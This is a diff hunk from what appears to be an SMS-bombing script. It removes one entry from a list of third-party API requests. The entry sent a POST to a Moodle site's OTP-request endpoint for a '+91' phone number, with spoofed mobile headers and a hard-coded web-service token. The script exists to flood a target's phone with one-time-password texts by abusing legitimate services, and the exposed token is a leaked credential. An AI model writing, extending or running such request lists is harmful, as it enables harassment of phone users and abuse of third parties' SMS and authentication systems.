@@ -7,36 +7,7 @@ def smsgii(number):
     
     # List of APIs with their corresponding URLs, headers, and payloads
     apis = [
-        
-        
-        {
-            "method": "POST",
-            "url": "https://learn.seekog.com/webservice/rest/server.php?moodlewsrestformat=json&wsfunction=auth_otp_request_otp",
-            "headers": {
-                "Host": "learn.seekog.com",
-                "content-length": "97",
-                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
-                "accept": "application/json, text/plain, */*",
-                "content-type": "application/x-www-form-urlencoded",
-                "sec-ch-ua-mobile": "?1",
-                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36 MoodleMobile 4.1.1 (41100)",
-                "sec-ch-ua-platform": '"Android"',
-                "origin": "http://localhost",
-                "x-requested-with": "com.moodle.seekog",
-                "sec-fetch-site": "cross-site",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
-                "referer": "http://localhost/",
-                "accept-encoding": "gzip, deflate, br, zstd",
-                "accept-language": "en-US,en;q=0.9",
-                "priority": "u=1, i"
-            },
-            "data": {
-                "username": "+91"+number,
-                "wsfunction": "auth_otp_request_otp",
-                "wstoken": "b9749ed9fefb5ec57dad6c05d93ab6da"
-            }
-        },
+
         
         {
             "method": "POST",
